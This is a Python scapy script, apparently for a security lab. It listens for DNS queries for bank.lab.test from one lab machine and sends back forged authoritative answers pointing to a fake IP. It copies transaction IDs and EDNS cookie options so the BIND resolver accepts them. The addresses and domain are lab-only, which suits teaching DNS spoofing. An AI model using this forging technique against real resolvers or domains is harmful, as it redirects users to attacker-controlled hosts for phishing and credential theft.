"""Lab-only DNS response simulator adapted from the Kali VM script."""

from scapy.all import DNS, DNSRR, IP, UDP, send, sniff

UBUNTU_IP = "192.168.72.144"
KALI_IP = "192.168.72.129"
TARGET_DOMAIN = b"bank.lab.test."
FAKE_IP = "203.0.113.66"


def handle_packet(pkt):
    if not (pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS)):
        return
    dns = pkt[DNS]
    if dns.qr != 0 or not dns.qd or dns.qd.qname.lower() != TARGET_DOMAIN:
        return

    print(
        f"[+] DNS query TXID={dns.id} source_port={pkt[UDP].sport} "
        f"name={dns.qd.qname.decode()}",
        flush=True,
    )
    spoofed = (
        IP(src=KALI_IP, dst=UBUNTU_IP)
        / UDP(sport=53, dport=pkt[UDP].sport)
        / DNS(
            id=dns.id,
            qr=1,
            aa=1,
            rd=dns.rd,
            qd=dns.qd,
            an=DNSRR(rrname=dns.qd.qname, type="A", ttl=300, rdata=FAKE_IP),
            # Preserve EDNS options, including the DNS COOKIE expected by BIND.
            ar=dns.ar,
            arcount=dns.arcount,
        )
    )
    send(spoofed, verbose=0)
    print(f"[+] Sent lab response: {TARGET_DOMAIN.decode()} -> {FAKE_IP}", flush=True)


sniff(
    filter=f"udp and src host {UBUNTU_IP} and dst host {KALI_IP} and dst port 53",
    prn=handle_packet,
    store=False,
)
